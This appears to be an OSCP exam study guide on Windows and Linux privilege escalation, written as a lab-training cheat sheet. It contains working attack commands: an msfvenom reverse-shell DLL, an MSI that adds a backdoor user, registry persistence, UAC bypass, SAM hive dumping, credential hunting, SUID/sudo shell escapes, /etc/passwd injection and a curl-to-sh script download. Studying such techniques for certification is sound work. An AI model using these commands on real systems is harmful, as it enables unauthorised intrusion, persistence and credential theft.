# OSCP Enhanced Privilege Escalation Guide  

## Table of Contents
- [Windows Privilege Escalation Mastery](#windows-privilege-escalation-mastery)
- [Linux Privilege Escalation Mastery](#linux-privilege-escalation-mastery)
- [TJ Null Specific Scenarios](#tj-null-specific-scenarios)
- [Advanced Techniques](#advanced-techniques)
- [Exam Strategy](#exam-strategy)

## Windows Privilege Escalation Mastery

### Initial Enumeration Enhanced
```cmd
# Basic system information (always run first)
whoami
whoami /priv
whoami /groups /fo list
hostname
systeminfo
ver

# Network configuration
ipconfig /all
route print
arp -a
netstat -ano

# Check current privileges for immediate wins
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeTcbPrivilege"
```

### Automated Enumeration Tools
```cmd
# WinPEAS (comprehensive)
winPEAS.exe
winPEAS.exe quiet
winPEAS.exe systeminfo

# PowerUp.ps1
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (focused enumeration)
Seatbelt.exe all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

### Service Exploitation Advanced

#### Unquoted Service Paths
```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell method
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notmatch "C:\\Windows\\" -and $_.PathName -notmatch '"'} | select PathName,DisplayName,Name

# Check permissions on directories
icacls "C:\Program Files\Unquoted Path Service\"
accesschk.exe -uwdq "C:\Program Files\Unquoted Path Service\"

# Exploitation
copy payload.exe "C:\Program Files\Unquoted.exe"
sc stop "vulnerable service"
sc start "vulnerable service"
```

#### Service Binary Hijacking
```cmd
# Find modifiable service binaries
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> services.txt
for /f %a in (services.txt) do @icacls "%a"

# PowerShell version
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "System32"} | ForEach-Object {icacls $_.PathName}

# Check service permissions
accesschk.exe -uwcqv "authenticated users" *
sc qc "vulnerable service"

# Exploitation
copy payload.exe "C:\path\to\service\binary.exe"
sc stop "vulnerable service"  
sc start "vulnerable service"
```

#### DLL Hijacking
```cmd
# Find services with missing DLLs
Process Monitor (procmon) - filter for "Process and Thread Activity" and "Image/DLL Activity"

# Common DLL hijacking locations
echo %PATH%
# Check writable directories in PATH
for %i in (%path:;= %) do @echo %i && icacls "%i"

# Create malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll > hijack.dll

# Place in writable directory in PATH or application directory
copy hijack.dll C:\writable\directory\missing.dll
```

### Registry Abuse

#### AlwaysInstallElevated
```cmd
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create MSI payload
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

#### AutoRun Registry Keys
```cmd
# Check for writable autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check permissions
accesschk.exe -uwkv HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Add malicious entry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```

### Token Impersonation

#### JuicyPotato (Windows Server 2016 and earlier)
```cmd
# Check for SeImpersonatePrivilege
whoami /priv | findstr SeImpersonatePrivilege

# Find CLSID for the OS version
# Windows Server 2016: {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Windows Server 2012: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# Execute JuicyPotato
JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -t * -c {CLSID}

# With custom payload
JuicyPotato.exe -l 1337 -p payload.exe -t * -c {CLSID}
```

#### PrintSpoofer (Windows 10/Server 2019+)
```cmd
# Check for SeImpersonatePrivilege
whoami /priv | findstr SeImpersonatePrivilege

# Execute PrintSpoofer
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "C:\path\to\payload.exe"

# Alternative: RoguePotato
RoguePotato.exe -r <redirector-ip> -e "C:\windows\system32\cmd.exe" -l 9999
```

### Scheduled Tasks Abuse
```cmd
# Enumerate scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo csv | findstr /v "INFO"

# Check task permissions
icacls C:\path\to\scheduled\task\binary.exe

# Check if task runs as SYSTEM
schtasks /query /tn "TaskName" /fo list /v

# Replace task binary if writable
copy payload.exe C:\path\to\scheduled\task\binary.exe

# Create new scheduled task (if privileges allow)
schtasks /create /sc onstart /tn "WindowsUpdate" /tr "C:\backdoor.exe" /ru system /f
```

### Credential Harvesting Advanced

#### Registry Credential Hunting
```cmd
# Comprehensive registry search
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile ProfileName key=clear
```

#### File-Based Credential Hunting
```cmd
# Search for configuration files
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.txt *.xml *.config *.ini *.inf

# Common sensitive file locations
type "C:\sysprep.inf"
type "C:\sysprep\sysprep.xml"
type "C:\unattend.xml"  
type "C:\Windows\Panther\Unattend.xml"
type "C:\Windows\Panther\Unattend\Unattend.xml"

# IIS configuration
dir /s web.config
findstr /si connectionstring web.config

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Kernel Exploits (Last Resort)
```cmd
# Check OS version and patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Search for kernel exploits
searchsploit Windows Server 2016 kernel
searchsploit Windows 10 privilege escalation

# Common kernel exploits by OS:
# Windows 7/2008: MS10-059, MS10-092, MS11-011
# Windows 8/2012: MS13-005, MS13-053, MS13-081  
# Windows 10/2016: MS16-032, MS16-135
```

## Linux Privilege Escalation Mastery

### Initial Enumeration Enhanced
```bash
# Basic system information
whoami
id
hostname
uname -a
cat /etc/os-release
cat /etc/issue

# Check sudo permissions immediately
sudo -l

# Check for SUID binaries (quick win check)
find / -type f -perm -4000 2>/dev/null | head -20

# Check for capabilities
getcap -r / 2>/dev/null
```

### Automated Enumeration
```bash
# LinPEAS (comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget -q -O - https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# pspy (process monitoring)
./pspy64 -pf -i 1000
```

### SUID Binary Exploitation Advanced

#### Common SUID Binaries for PrivEsc
```bash
# Find all SUID binaries
find / -type f -perm -4000 2>/dev/null

# GTFOBins exploitation patterns:

# vim/nano
vim -c ':!/bin/sh'
nano
^R^X
reset; sh 1>&0 2>&0

# find
find . -exec /bin/sh \; -quit
find . -exec whoami \;

# awk
awk 'BEGIN {system("/bin/sh")}'

# nmap (older versions)
nmap --interactive
!sh

# less/more
less /etc/hosts
!/bin/sh

# cp (if SUID)
cp /etc/passwd /tmp/passwd
echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su root2
```

### Sudo Misconfigurations

#### Comprehensive Sudo Analysis
```bash
# Check sudo permissions
sudo -l

# Common sudo misconfigurations:

# ALL=(ALL) NOPASSWD: ALL
sudo su -

# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'

# (root) NOPASSWD: /usr/bin/python*
sudo python -c 'import os; os.system("/bin/sh")'

# LD_PRELOAD exploitation (if env_keep+=LD_PRELOAD)
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); }' > shell.c
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so find
```

### Capabilities Exploitation
```bash
# Find capabilities
getcap -r / 2>/dev/null

# Common capability exploits:

# cap_setuid+ep
# If python has cap_setuid
python -c "import os; os.setuid(0); os.system('/bin/bash')"

# cap_dac_read_search+ep  
# Can read any file
python -c "print(open('/etc/shadow').read())"

# cap_fowner+ep
# Can change file ownership
python -c "import os; os.chown('/etc/passwd', 1000, 1000)"
```

### Cron Job Exploitation

#### Cron Job Enumeration
```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User cron jobs
crontab -l
cat /var/spool/cron/crontabs/*

# Process monitoring for cron jobs
./pspy64 -pf -i 1000
```

#### Cron Job Exploitation Techniques
```bash
# Writable script in cron job
echo '#!/bin/bash' > /path/to/writable/script.sh
echo 'chmod +s /bin/bash' >> /path/to/writable/script.sh
# Wait for cron execution, then:
/bin/bash -p

# PATH variable exploitation in cron
echo '#!/bin/bash' > /tmp/cp
echo 'chmod +s /bin/bash' >> /tmp/cp
chmod +x /tmp/cp
# If cron job uses relative paths and /tmp is in PATH

# Wildcard injection
# If cron job does: tar czf /tmp/backup.tar.gz *
echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

### Kernel Exploits (Last Resort)
```bash
# Check kernel version
uname -r
cat /proc/version

# Search for kernel exploits
searchsploit linux kernel $(uname -r)
searchsploit linux $(lsb_release -d | cut -d: -f2 | xargs)

# Common kernel exploits by version:
# 2.6.x: DirtyCow, Overlayfs
# 3.x-4.4: DirtyCow (CVE-2016-5195)
# 4.4.x: AF_PACKET (CVE-2017-7308)
# 4.8.x-4.10.x: AF_PACKET (CVE-2017-7308)
```

## TJ Null Specific Scenarios

### Common TJ Null Privilege Escalation Patterns

#### Pattern 1: Service Misconfiguration (Windows)
```cmd
# Typical TJ Null Windows box scenario:
# 1. Unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 2. Check write permissions
icacls "C:\Program Files\Service Directory\"

# 3. Create payload and restart service
copy shell.exe "C:\Program Files\Service.exe"
sc stop ServiceName
sc start ServiceName
```

#### Pattern 2: SUID Binary (Linux)
```bash
# Typical TJ Null Linux box scenario:
# 1. Find unusual SUID binary
find / -perm -4000 2>/dev/null | grep -v '/usr/bin\|/bin\|/usr/sbin\|/sbin'

# 2. Check if it's a custom binary or standard tool
file /path/to/suid/binary
strings /path/to/suid/binary

# 3. Exploit via GTFOBins or command injection
/path/to/suid/binary --help
```

#### Pattern 3: Cron Job with Writable Script (Linux)
```bash
# Common in TJ Null boxes:
# 1. Find writable cron scripts
cat /etc/crontab
ls -la /etc/cron.hourly/

# 2. Modify script to add backdoor
echo 'chmod +s /bin/bash' >> /path/to/writable/script.sh

# 3. Wait for execution
watch -n 1 ls -la /bin/bash
# When SUID bit is set:
/bin/bash -p
```

### TJ Null Difficulty Progression

#### Easy Box PrivEsc:
- [ ] Obvious sudo -l misconfiguration
- [ ] Clear SUID binary with known exploit
- [ ] Simple service misconfiguration
- [ ] Kernel exploit with public PoC
- [ ] Plaintext credentials in files

#### Medium Box PrivEsc:
- [ ] Requires enumeration to find vector
- [ ] Chain of smaller misconfigurations
- [ ] Custom binary analysis needed
- [ ] Cron job with PATH manipulation
- [ ] Registry hunting for credentials

#### Hard Box PrivEsc:
- [ ] Obscure privilege escalation vector
- [ ] Binary exploitation or reversing
- [ ] Complex service interaction
- [ ] Custom exploit development
- [ ] Multiple enumeration methods required

## Advanced Techniques

### Windows Advanced

#### UAC Bypass Techniques
```cmd
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# FodHelper UAC bypass (Windows 10)
reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ
reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command" /ve /d "C:\path\to\payload.exe" /t REG_SZ
fodhelper.exe

# ComputerDefaults UAC bypass
reg add "HKCU\SOFTWARE\Classes\exefile\shell\open\command" /ve /d "C:\path\to\payload.exe" /t REG_SZ
reg add "HKCU\SOFTWARE\Classes\exefile\shell\open\command" /v DelegateExecute /t REG_SZ
ComputerDefaults.exe
```

#### Advanced Token Techniques
```cmd
# Get all tokens
whoami /all

# Check for specific dangerous privileges
whoami /priv | findstr /i "SeDebugPrivilege SeTakeOwnershipPrivilege SeBackupPrivilege SeRestorePrivilege"

# Abuse SeBackupPrivilege to read sensitive files
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SECURITY C:\temp\security.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

### Linux Advanced

#### Container Escape Techniques
```bash
# Check if in container
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv

# Check capabilities in container
capsh --print

# Mount host filesystem (if privileged container)
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

#### Advanced SUID Exploitation
```bash
# Custom SUID binary analysis
objdump -T /path/to/suid/binary
strace /path/to/suid/binary 2>&1 | grep -E "open|read|write"

# Library hijacking
ldd /path/to/suid/binary
# Create malicious library
gcc -shared -fPIC -o /tmp/libc.so.6 malicious.c
LD_PRELOAD=/tmp/libc.so.6 /path/to/suid/binary
```

## Exam Strategy

### Windows PrivEsc Methodology (30 minutes max)
1. **Quick Wins** (5 minutes):
   - `whoami /priv` for token impersonation
   - `sudo -l` equivalent checks
   - Quick service enumeration

2. **Automated Scan** (10 minutes):
   - Run WinPEAS or PowerUp
   - Review output methodically

3. **Manual Verification** (10 minutes):
   - Verify automated findings
   - Check file/service permissions
   - Test exploits

4. **Exploitation** (5 minutes):
   - Execute chosen technique
   - Verify SYSTEM access
   - Grab proof

### Linux PrivEsc Methodology (30 minutes max)
1. **Quick Wins** (5 minutes):
   - `sudo -l` for obvious misconfigs
   - Quick SUID check
   - Check for obvious capabilities

2. **Automated Scan** (10 minutes):
   - Run LinPEAS
   - Start pspy in background

3. **Manual Analysis** (10 minutes):
   - Review automated results
   - Check cron jobs thoroughly
   - Verify file permissions

4. **Exploitation** (5 minutes):
   - Execute chosen technique
   - Verify root access
   - Grab proof

### Common PrivEsc Mistakes to Avoid

#### Mistake 1: Skipping Obvious Checks
❌ **Wrong**: Running automated tools first
✅ **Correct**: Always check `whoami /priv` and `sudo -l` first

#### Mistake 2: Not Verifying Automated Results
❌ **Wrong**: Trusting tool output blindly
✅ **Correct**: Manually verify findings before exploitation

#### Mistake 3: Spending Too Long on Kernel Exploits
❌ **Wrong**: Trying kernel exploits for hours
✅ **Correct**: Kernel exploits are usually last resort in OSCP

#### Mistake 4: Missing File Permission Details
❌ **Wrong**: Not checking exact permissions
✅ **Correct**: Use `icacls` (Windows) or `ls -la` (Linux) to verify

Remember: Privilege escalation in OSCP rewards systematic enumeration and understanding of common misconfigurations. Master the fundamentals before attempting advanced techniques!